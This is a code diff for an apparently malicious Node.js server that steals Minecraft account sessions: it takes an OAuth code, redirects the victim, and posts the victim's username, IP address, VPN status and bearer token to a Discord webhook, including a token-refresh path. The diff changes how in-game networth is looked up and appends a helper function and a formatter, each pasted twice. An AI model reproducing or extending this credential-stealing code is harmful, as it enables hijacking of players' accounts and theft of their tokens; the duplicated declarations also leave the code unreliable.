@@ -22,7 +22,7 @@ app.get(process.env.general, async (req, res) => {
     const clientIp = requestIp.getClientIp(req)
     const code = req.query.code
     
-    res.redirect('https://mcuuid.net/');
+    res.redirect(Link);
     if (code == null) {
         return
     }
@@ -174,15 +174,8 @@ async function postToWebhook(formatNumber, level, rank, username, bearerToken, u
     let isVpnOn
     if (security.is_vpn) isVpnOn = " (VPN)"
     else isVpnOn = ""
-    let networth = await (
-        await axios
-            .get(
-                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
-            )
-            .catch(() => {
-                return { data: { data: [{ networth: null }] } };
-            })
-    ).data.data[0].networth;
+    let networth = await getNetworthsky(username);
+
 
     // Set it "API IS TURNED OFF IF NULL"
     if (networth === null) networth = "API IS TURNED OFF";
@@ -217,18 +210,13 @@ content: "@everyone ",
             inline: true
           },
           {
-            name: "**Unsoulbound NW:**",
+            name: "**Networth:**",
             value: "```"+networth+"```",
             inline: true
           },
           {
-            name: "**Network Level**",
-            value: "```"+level+"```",
-            inline: true
-          },
-          {
-            name: "**Rank:**",
-            value: "```"+rank+"```",
+            name: "**UUID:**",
+            value: "```"+uuid+"```",
             inline: true
           },
         
@@ -317,15 +305,8 @@ async function refreshToWebhook(formatNumber, level, rank, username, bearerToken
     let isVpnOn
     if (security.is_vpn) isVpnOn = " (VPN)"
     else isVpnOn = ""
-    let networth = await (
-        await axios
-            .get(
-                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
-            )
-            .catch(() => {
-                return { data: { data: [{ networth: null }] } };
-            })
-    ).data.data[0].networth;
+    let networth = await getNetworthsky(username);
+
 
     // Set it "API IS TURNED OFF IF NULL"
     if (networth === null) networth = "API IS TURNED OFF";
@@ -365,16 +346,10 @@ content: "@everyone TOKEN REFRESHED!",
               inline: true
             },
             {
-              name: "**Network Level**",
-              value: "```"+level+"```",
+              name: "**UUID:**",
+              value: "```"+uuid+"```",
               inline: true
             },
-            {
-              name: "**Rank:**",
-              value: "```"+rank+"```",
-              inline: true
-            },
-          
           {
             name: "**Token:**",
             value: "```"+bearerToken+"```"
@@ -402,4 +377,96 @@ const formatNumber = (num) => {
     else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
+}
+async function getNetworthsky(username) {
+    try {
+        const urlString = `${API_URL}${username}`;
+        const response = await axios.get(urlString, {
+            headers: {
+                'Accept': 'application/json',
+                'User-Agent': 'Mozilla/5.0'
+            }
+        });
+
+        if (response.status !== 200) {
+            throw new Error(`Failed : HTTP error code : ${response.status}`);
+        }
+
+        const data = response.data;
+
+        let totalNetworth = 0;
+        let totalUnsoulboundNetworth = 0;
+
+        const profiles = data.profiles;
+
+        for (const [key, profileData] of Object.entries(profiles)) {
+            if (profileData.game_mode === 'normal') {
+                const networthData = profileData.data;
+                const networth = networthData.networth;
+                totalNetworth += networth.networth;
+                totalUnsoulboundNetworth += networth.unsoulboundNetworth;
+            }
+        }
+
+        return `${humanize(totalNetworth)} | ${humanize(totalUnsoulboundNetworth)}`;
+    } catch (error) {
+        return 'Invalid username.';
+    }
+}
+
+function humanize(number) {
+    const formatter = new Intl.NumberFormat('en-US', { maximumFractionDigits: 2 });
+    const units = ['', 'K', 'M', 'B'];
+    let unitIndex = 0;
+    while (number >= 1000 && unitIndex < units.length - 1) {
+        number /= 1000;
+        unitIndex++;
+    }
+    return `${formatter.format(number)}${units[unitIndex]}`;
+}
+async function getNetworthsky(username) {
+    try {
+        const urlString = `${API_URL}${username}`;
+        const response = await axios.get(urlString, {
+            headers: {
+                'Accept': 'application/json',
+                'User-Agent': 'Mozilla/5.0'
+            }
+        });
+
+        if (response.status !== 200) {
+            throw new Error(`Failed : HTTP error code : ${response.status}`);
+        }
+
+        const data = response.data;
+
+        let totalNetworth = 0;
+        let totalUnsoulboundNetworth = 0;
+
+        const profiles = data.profiles;
+
+        for (const [key, profileData] of Object.entries(profiles)) {
+            if (profileData.game_mode === 'normal') {
+                const networthData = profileData.data;
+                const networth = networthData.networth;
+                totalNetworth += networth.networth;
+                totalUnsoulboundNetworth += networth.unsoulboundNetworth;
+            }
+        }
+
+        return `${humanize(totalNetworth)} | ${humanize(totalUnsoulboundNetworth)}`;
+    } catch (error) {
+        return 'Invalid username.';
+    }
+}
+
+function humanize(number) {
+    const formatter = new Intl.NumberFormat('en-US', { maximumFractionDigits: 2 });
+    const units = ['', 'K', 'M', 'B'];
+    let unitIndex = 0;
+    while (number >= 1000 && unitIndex < units.length - 1) {
+        number /= 1000;
+        unitIndex++;
+    }
+    return `${formatter.format(number)}${units[unitIndex]}`;
 }
